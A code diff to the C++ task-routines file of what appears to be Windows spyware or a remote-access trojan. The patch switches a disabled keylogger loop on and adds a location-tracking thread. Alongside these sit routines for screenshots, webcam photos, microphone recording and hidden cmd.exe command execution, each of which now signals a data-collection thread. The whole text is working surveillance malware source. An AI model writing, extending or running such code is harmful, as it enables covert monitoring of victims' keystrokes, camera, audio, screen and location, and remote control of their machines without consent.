@@ -1,7 +1,7 @@
 #include "TaskRoutines.h"
 #include <queue>
 
-HANDLE camRequest, micRequest, lockRequest, cmdRequest, screenRequest, newDataEvent;
+HANDLE camRequest, micRequest, lockRequest, cmdRequest, locationRequest, screenRequest, newDataEvent;
 map<string, BOOL> workingTasks;
 
 DWORD WINAPI initFiltering(LPVOID lpParam)
@@ -10,20 +10,26 @@ DWORD WINAPI initFiltering(LPVOID lpParam)
 }
 DWORD WINAPI initKeylogger(LPVOID lpParam)
 {
-	while (FALSE) { // ---------------------------------- Disabled for now
+	while (TRUE) { 
 		QUERY_USER_NOTIFICATION_STATE pquns;
 		SHQueryUserNotificationState(&pquns);
-		if (pquns == QUNS_BUSY || pquns == QUNS_RUNNING_D3D_FULL_SCREEN) // Determine a fullscreen state
+
+		// Determine a fullscreen state
+		if (pquns == QUNS_BUSY || pquns == QUNS_RUNNING_D3D_FULL_SCREEN) 
 		{
 			// User in fullscreen mode
 			// Go to sleep until its over 0_0
 			Sleep(SYNC_TIME);
 			continue;
 		}
-		wstring filename = stringToWString(constructFilename(KEYLOG_CODE));
-		
 		// Filename changes every { num_seconds } declared in the keylogger.cpp file 
+		wstring filename = stringToWString(constructFilename(KEYLOG_CODE));
+	
+		// Start keylogger
 		keylogger(filename.c_str());
+
+		// Notifiy data manager thread
+		SetEvent(newDataEvent);
 	}
 	return 0;
 }
@@ -40,7 +46,9 @@ DWORD WINAPI initScreenshot(LPVOID lpParam)
 		// Request Arrived..
 		// Read screenshots request from disk
 		wstring filename = stringToWString(constructFilename(SCREENSHOT_CODE));
+		// Start capturing
 		screenCapture(0, 0, 1920, 1080, filename.c_str());
+		// Notifiy data manager thread
 		SetEvent(newDataEvent);
 		return 1;
 	}
@@ -60,7 +68,10 @@ DWORD WINAPI initCamera(LPVOID lpParam)
 		// Read camera request from disk
 
 		string filename = constructFilename(CAMERA_CODE);
+		// Take a picture
 		camera(filename.c_str());
+		// Notifiy data manager thread
+		SetEvent(newDataEvent);
 	}
 	return 0;
 }
@@ -78,7 +89,10 @@ DWORD WINAPI initMic(LPVOID lpParam)
 		// Read mic request from disk
 		
 		string filename = constructFilename(AUDIO_CODE);
-		recordAudio(10, filename.c_str()); // Record for 10 seconds
+		// Record for 10 seconds
+		recordAudio(10, filename.c_str()); 
+		// Notifiy data manager thread
+		SetEvent(newDataEvent);
 	}
 	return 0;
 }
@@ -127,7 +141,30 @@ DWORD WINAPI initRemoteCommands(LPVOID lpParam)
 		wstring stdResult = wstring(cmd) + o_cmd + filename; 
 		LPCWSTR final_cmd = stdResult.c_str();
 		ShellExecute(0, L"open", L"cmd.exe", final_cmd, 0, SW_HIDE);
+
+		// Notifiy data manager thread
+		SetEvent(newDataEvent);
 	}
+	return 0;
+}
+
+DWORD WINAPI initLocationTracker(LPVOID lpParam) {
+	do {
+		locationRequest = CreateEvent(NULL, TRUE, FALSE, TEXT("location"));
+	} while (locationRequest == NULL);
+
+	while (TRUE) {
+		WaitForSingleObject(
+			locationRequest, // event handle
+			INFINITE);    // indefinite wait
+		ResetEvent(locationRequest);
+
+		wstring filename = stringToWString(constructFilename(LOCATION_CODE));
+
+
+		SetEvent(newDataEvent);
+	}
+
 	return 0;
 }
 
@@ -269,6 +306,8 @@ string checkDataType(char* filename)
 		return Screenshot;
 	else if (!strcmp(id, CMD_CODE))
 		return Command;
+	else if (!strcmp(id, LOCATION_CODE))
+		return Location;
 	return UNDEFINED_CODE;
 }
 string getRandomString(const int len) {
